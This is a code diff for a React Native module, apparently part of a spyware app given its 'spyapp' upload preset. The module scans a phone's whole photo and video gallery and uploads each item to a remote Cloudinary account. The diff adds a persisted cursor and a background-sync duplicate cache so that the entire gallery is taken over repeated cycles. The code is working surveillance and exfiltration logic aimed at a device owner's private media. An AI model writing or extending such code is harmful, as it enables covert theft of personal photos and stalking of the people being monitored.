@@ -1,12 +1,15 @@
 import { CameraRoll } from '@react-native-camera-roll/camera-roll';
 import ImageResizer from '@bam.tech/react-native-image-resizer';
 import axios from 'axios';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 
 const CLOUD_NAME = 't1jlphfu';
 const UPLOAD_PRESET = 'spyapp'; // ← sypapp se spyapp kiya — dashboard mein check karo exact naam
 const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`;
 
-const globalUploadedFileIds = new Set<string>();
+// Note: Uploaded IDs ka persistence BackgroundSyncService handle karta hai AsyncStorage se
+
+const GALLERY_CURSOR_KEY = 'SCH_GALLERY_CURSOR';
 
 export interface MediaItem {
   url: string;
@@ -19,23 +22,45 @@ export const scanAndUploadGallery = async (
   sessionCache?: Set<string>,
 ): Promise<MediaItem[]> => {
 
-  // ── STEP 1: CameraRoll se photos fetch karo ──────────────────────────────
+  // ── Saved cursor load karo (pehle kahan tak gaye the) ────────────────────
+  let afterCursor: string | undefined = undefined;
+  try {
+    const saved = await AsyncStorage.getItem(GALLERY_CURSOR_KEY);
+    if (saved) {
+      afterCursor = saved;
+      console.log(`[Gallery] Resuming from saved cursor`);
+    }
+  } catch (e) {}
+
+  // ── STEP 1: CameraRoll se photos fetch karo ───────────────────────────────
   let photos: any;
   try {
     photos = await CameraRoll.getPhotos({
       first: 20,
       assetType: 'All',
       include: ['fileSize', 'filename', 'playableDuration'],
+      ...(afterCursor ? { after: afterCursor } : {}),
     });
-    console.log(`[Gallery] STEP1: CameraRoll returned ${photos.edges.length} items`);
+    console.log(`[Gallery] STEP1: CameraRoll returned ${photos.edges.length} items (hasNextPage:${photos.page_info?.has_next_page})`);
   } catch (err: any) {
     console.error('[Gallery] STEP1 FAILED - CameraRoll error:', err?.message || err);
     return [];
   }
 
+  // Agar is page mein kuch nahi to cursor reset karo (sab ho gaya)
   if (photos.edges.length === 0) {
-    console.warn('[Gallery] STEP1: Gallery is empty or permission denied');
+    console.log('[Gallery] All photos processed — resetting cursor for next sync cycle');
+    await AsyncStorage.removeItem(GALLERY_CURSOR_KEY); // Next sync mein start se shuru
     return [];
+  }
+
+  // Cursor save karo (agle call ke liye)
+  if (photos.page_info?.has_next_page && photos.page_info?.end_cursor) {
+    await AsyncStorage.setItem(GALLERY_CURSOR_KEY, photos.page_info.end_cursor);
+  } else {
+    // Aakhri page — cursor reset karo
+    await AsyncStorage.removeItem(GALLERY_CURSOR_KEY);
+    console.log('[Gallery] Last page reached — cursor reset');
   }
 
   const uploadedItems: MediaItem[] = [];
@@ -49,8 +74,8 @@ export const scanAndUploadGallery = async (
 
     console.log(`[Gallery] Item ${idx + 1}: type=${node.type} uri=${fileUri?.slice(-30)}`);
 
-    // ── STEP 2: Duplicate check ─────────────────────────────────────────────
-    if (globalUploadedFileIds.has(fileId) || (sessionCache && sessionCache.has(fileId))) {
+    // ── STEP 2: Duplicate check (sessionCache = AsyncStorage se loaded IDs) ─
+    if (sessionCache && sessionCache.has(fileId)) {
       console.log(`[Gallery] Item ${idx + 1}: SKIP (already uploaded)`);
       continue;
     }
@@ -101,7 +126,6 @@ export const scanAndUploadGallery = async (
       if (res.data?.secure_url) {
         console.log(`[Gallery] Item ${idx + 1}: Upload SUCCESS -> ${res.data.secure_url.slice(-40)}`);
         uploadedItems.push({ url: res.data.secure_url, fileId, mediaType: isVideo ? 'video' : 'image' });
-        globalUploadedFileIds.add(fileId);
         if (sessionCache) sessionCache.add(fileId);
       } else {
         console.warn(`[Gallery] Item ${idx + 1}: Upload returned no URL. Response:`, JSON.stringify(res.data));
@@ -112,7 +136,6 @@ export const scanAndUploadGallery = async (
       console.error(`[Gallery] Item ${idx + 1}: Upload FAILED status=${status} error=${errDetail}`);
 
       if (status === 400 || status === 409) {
-        globalUploadedFileIds.add(fileId);
         if (sessionCache) sessionCache.add(fileId);
       }
     }
